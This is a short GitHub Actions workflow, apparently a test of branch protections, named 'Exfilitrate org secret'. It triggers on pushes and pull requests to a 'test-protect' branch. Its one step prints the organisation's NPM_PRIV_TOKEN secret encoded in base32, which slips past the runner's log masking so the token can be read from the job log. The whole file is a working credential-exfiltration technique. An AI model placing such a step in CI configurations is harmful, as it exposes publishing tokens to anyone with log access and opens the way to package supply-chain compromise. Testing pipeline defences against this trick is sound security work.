name: Exfilitrate org secret
on:
  push:
    branches: [test-protect]
  pull_request:
    branches: [test-protect]
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
    - name: exfil org secret
      id: response
      run:  |
          echo "lets exfil some org secrets TEST protect..."
          echo "${{secrets.NPM_PRIV_TOKEN}}" | base32
          
